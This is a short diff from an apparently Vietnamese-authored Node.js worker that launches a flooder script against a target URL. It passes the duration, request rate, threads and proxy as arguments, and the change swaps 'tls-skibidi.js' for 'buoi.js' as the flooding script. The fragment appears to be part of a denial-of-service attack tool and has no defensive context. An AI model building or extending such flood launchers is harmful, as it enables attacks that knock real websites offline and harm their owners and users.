@@ -6,7 +6,7 @@ const { url, time, rate, thea, proxy } = workerData;
 const mode = 'skibidi';
 // Hàm chạy flooder.js
 function runFlooder() {
-    const flooder = spawn('node', ['tls-skibidi.js', url, time, rate, thea, proxy, mode]);
+    const flooder = spawn('node', ['buoi.js', url, time, rate, thea, proxy, mode]);
 
     flooder.stdout.on('data', (data) => {
         parentPort.postMessage(`Output: ${data}`);
